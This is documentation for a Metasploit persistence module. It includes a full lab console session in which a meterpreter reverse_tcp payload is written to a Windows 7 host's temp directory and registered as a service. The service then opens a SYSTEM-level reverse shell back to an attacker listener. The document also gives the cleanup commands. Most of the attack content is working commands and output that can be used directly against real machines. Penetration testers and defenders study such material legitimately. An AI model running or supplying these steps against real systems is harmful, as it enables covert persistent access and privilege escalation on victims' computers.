## Description

This Module will generate and upload an executable to a remote host, next will make it a persistent service.
It will create a new service which will start the payload whenever the service is running. Admin or system privilege is required.

## Options

 **REMOTE_EXE_NAME**

 The remote victim name. Random string as default.

 **REMOTE_EXE_PATH**

The remote victim exe path to run. Use temp directory as default.

 **RETRY_TIME**

The retry time that shell connect failed. 5 seconds as default.

 **SERVICE_DESCRIPTION**

The description of service. Random string as default.

 **SERVICE_NAME**

The name of service. Random string as default.

## Verification Steps

1. get session on target
2. `use exploit/windows/local/persistence_service`
3. `set payload <payload>`
4. `set lport <lport>`
5. `set lhost <lhost>`
6. `exploit`

## Scenarios

### Windows 7 SP1 x64

```
msf5 exploit(windows/local/persistence_service) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: test-PC\test
meterpreter > sysinfo
Computer        : TEST-PC
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(windows/local/persistence_service) > use exploit/windows/local/persistence_service
msf5 exploit(windows/local/persistence_service) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(windows/local/persistence_service) > set lport 2333
lport => 2333
msf5 exploit(windows/local/persistence_service) > set lhost 192.168.56.1
lhost => 192.168.56.1
msf5 exploit(windows/local/persistence_service) > set session 1
session => 1
msf5 exploit(windows/local/persistence_service) > exploit

[*] Started reverse TCP handler on 192.168.56.1:2333
[*] Running module against TEST-PC

[+] Meterpreter service exe written to C:\Users\test\AppData\Local\Temp\NVNvCyn.exe
[*] Creating service NePaGwA
[*] Cleanup Meterpreter RC File: /Users/green/.msf4/logs/persistence/TEST-PC_20181022.5605/TEST-PC_20181022.5605.rc
[*] Sending stage (179779 bytes) to 192.168.56.101
[*] Meterpreter session 4 opened (192.168.56.1:2333 -> 192.168.56.101:52781) at 2018-10-22 17:56:21 +0800

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : TEST-PC
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > background
[*] Backgrounding session 4...
```

**Clean it**

```
msf5 exploit(windows/local/persistence_service) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > resource /Users/green/.msf4/logs/persistence/TEST-PC_20181022.5605/TEST-PC_20181022.5605.rc
[*] Processing /Users/green/.msf4/logs/persistence/TEST-PC_20181022.5605/TEST-PC_20181022.5605.rc for ERB directives.
resource (/Users/green/.msf4/logs/persistence/TEST-PC_20181022.5605/TEST-PC_20181022.5605.rc)> execute -H -f sc.exe -a "stop NePaGwA"
Process 6516 created.
resource (/Users/green/.msf4/logs/persistence/TEST-PC_20181022.5605/TEST-PC_20181022.5605.rc)> execute -H -f sc.exe -a "delete NePaGwA"
Process 6624 created.
resource (/Users/green/.msf4/logs/persistence/TEST-PC_20181022.5605/TEST-PC_20181022.5605.rc)> execute -H -i -f taskkill.exe -a "/f /im NVNvCyn.exe"
Process 5636 created.
Channel 23 created.
SUCCESS: The process "NVNvCyn.exe" with PID 5180 has been terminated.
SUCCESS: The process "NVNvCyn.exe" with PID 4828 has been terminated.
SUCCESS: The process "NVNvCyn.exe" with PID 5728 has been terminated.
resource (/Users/green/.msf4/logs/persistence/TEST-PC_20181022.5605/TEST-PC_20181022.5605.rc)> rm C:\\Users\\test\\AppData\\Local\\Temp\\NVNvCyn.exe
meterpreter > 
